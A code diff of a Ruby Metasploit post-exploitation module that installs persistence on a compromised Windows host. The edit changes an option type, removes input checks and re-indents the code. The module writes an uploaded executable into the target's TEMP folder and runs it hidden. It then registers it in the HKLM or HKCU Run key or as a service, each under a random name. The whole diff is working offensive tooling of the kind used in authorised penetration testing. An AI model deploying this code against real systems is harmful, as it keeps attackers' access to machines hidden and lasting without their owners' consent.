@@ -39,7 +39,7 @@ class MetasploitModule < Msf::Post
     register_options(
         [
             OptEnum.new('STARTUP', [true, 'Startup type for the persistent payload.', 'USER', ['USER','SYSTEM','SERVICE']]),
-            OptString.new('REXEPATH',[true, 'The remote executable to use.','my/default/path']),
+            OptPath.new('REXEPATH',[true, 'The remote executable to use.']),
             OptString.new('REXENAME',[true, 'The name to call exe on remote system','default.exe'])
         ], self.class)
 
@@ -56,17 +56,6 @@ class MetasploitModule < Msf::Post
         rexename = datastore['REXENAME']
         host,port = session.tunnel_peer.split(':')
         @clean_up_rc = ""
-
-
-        if datastore['REXEPATH'] == nil
-            print_error ("REXE is null...please define")
-            return
-        end
-
-        if not ::File.exist?(datastore['REXEPATH'])
-            print_error ("REXE file does not exist!")
-            return
-        end
 
         raw = create_payload_from_file (rexe)
 
@@ -86,7 +75,7 @@ class MetasploitModule < Msf::Post
             when /SERVICE/i
                 install_as_service(script_on_target)
         end
-
+    
         clean_rc = log_file()
         file_local_write(clean_rc,@clean_up_rc)
         print_status("Cleanup Meterpreter RC File: #{clean_rc}")
@@ -104,101 +93,102 @@ class MetasploitModule < Msf::Post
             :commands =>  @clean_up_rc
                     }
                     )
-        end
+    end
 
 
         # Function for creating log folder and returning log path
         #-------------------------------------------------------------------------------
-        def log_file(log_path = nil)
+    def log_file(log_path = nil)
 
-            #Get hostname
-            host = session.sys.config.sysinfo["Computer"]
+        #Get hostname
+        host = session.sys.config.sysinfo["Computer"]
 
-            # Create Filename info to be appended to downloaded files
-            filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
+        # Create Filename info to be appended to downloaded files
+        filenameinfo = "_" + ::Time.now.strftime("%Y%m%d.%M%S")
 
-            # Create a directory for the logs
-            if log_path
-                 logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
-                 else
-                 logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
-            end
-
-            # Create the log directory
-            ::FileUtils.mkdir_p(logs)
-
-            #logfile name
-            logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
-            return logfile
-
-end
-
-        # Function to execute script on target and return the PID of the process
-        #-------------------------------------------------------------------------------
-        def target_exec(script_on_target)
-
-            print_status("Executing script #{script_on_target}")
-            proc = session.sys.process.execute(script_on_target, nil, {'Hidden' => true})
-            print_good("Agent executed with PID #{proc.pid}")
-            @clean_up_rc << "kill #{proc.pid}\n"
-            return proc.pid
-
+        # Create a directory for the logs
+        if log_path
+            logs = ::File.join(log_path, 'logs', 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
+            else
+            logs = ::File.join(Msf::Config.log_directory, 'persistence', Rex::FileUtils.clean_path(host + filenameinfo) )
         end
 
-        # Function to install payload in to the registry HKLM or HKCU
-        #-------------------------------------------------------------------------------
-        def write_to_reg(key,script_on_target)
+        # Create the log directory
+        ::FileUtils.mkdir_p(logs)
 
+        #logfile name
+        logfile = logs + ::File::Separator + Rex::FileUtils.clean_path(host + filenameinfo) + ".rc"
+        return logfile
+
+    end
+
+    # Function to execute script on target and return the PID of the process
+    #-------------------------------------------------------------------------------
+    def target_exec(script_on_target)
+
+        print_status("Executing script #{script_on_target}")
+        proc = session.sys.process.execute(script_on_target, nil, {'Hidden' => true})
+        print_good("Agent executed with PID #{proc.pid}")
+        @clean_up_rc << "kill #{proc.pid}\n"
+        return proc.pid
+
+    end
+
+    # Function to install payload in to the registry HKLM or HKCU
+    #-------------------------------------------------------------------------------
+    def write_to_reg(key,script_on_target)
+
+        nam = Rex::Text.rand_text_alpha(rand(8)+8)
+        print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+        if(key)
+            registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
+            print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
+            else
+            print_error("Error: failed to open the registry key for writing")
+        end
+
+    end
+
+    # Function to install payload as a service
+    #-------------------------------------------------------------------------------
+    def install_as_service(script_on_target)
+
+        if  is_system? or is_admin?
+            print_status("Installing as service..")
             nam = Rex::Text.rand_text_alpha(rand(8)+8)
-            print_status("Installing into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-            if(key)
-                registry_setvaldata("#{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",nam,script_on_target,"REG_SZ")
-                print_good("Installed into autorun as #{key}\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\#{nam}")
-                else
-                print_error("Error: failed to open the registry key for writing")
-            end
-
+            print_status("Creating service #{nam}")
+            service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
+            @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
+            else
+            print_error("Insufficient privileges to create service")
         end
 
-        # Function to install payload as a service
-        #-------------------------------------------------------------------------------
-        def install_as_service(script_on_target)
-
-            if  is_system? or is_admin?
-                print_status("Installing as service..")
-                nam = Rex::Text.rand_text_alpha(rand(8)+8)
-                print_status("Creating service #{nam}")
-                service_create(nam, nam, "cmd /c \"#{script_on_target}\"")
-                @clean_up_rc << "execute -H -f sc -a \"delete #{nam}\"\n"
-                else
-                print_error("Insufficient privileges to create service")
-            end
-
-        end
+    end
 
 
-        # Function for writing executable to target host
-        #-------------------------------------------------------------------------------
-        def write_exe_to_target(rexe ,rexename)
+    # Function for writing executable to target host
+    #-------------------------------------------------------------------------------
+    def write_exe_to_target(rexe ,rexename)
 
-            tempdir = session.fs.file.expand_path("%TEMP%")
-            temprexe = tempdir + "\\" + rexename
-            fd = session.fs.file.new(temprexe, "wb")
-            fd.write(rexe)
-            fd.close
-            print_good("Persistent Script written to #{temprexe}")
-            @clean_up_rc << "rm #{temprexe}\n"
-            return temprexe
+        tempdir = session.fs.file.expand_path("%TEMP%")
+        temprexe = tempdir + "\\" + rexename
+        fd = session.fs.file.new(temprexe, "wb")
+        fd.write(rexe)
+        fd.close
+    
+        print_good("Persistent Script written to #{temprexe}")
+        @clean_up_rc << "rm #{temprexe}\n"
+        return temprexe
 
-        end
+    end
 
-        #Function to create executable from a file
-        #-------------------------------------------------------------------------------
-        def create_payload_from_file(exec)
+    #Function to create executable from a file
+    #-------------------------------------------------------------------------------
+    def create_payload_from_file(exec)
 
-            print_status("Reading Payload from file #{exec}")
-            return ::IO.read(exec)
+        print_status("Reading Payload from file #{exec}")
+        return ::IO.read(exec)
 
-        end
+    end
 
 end
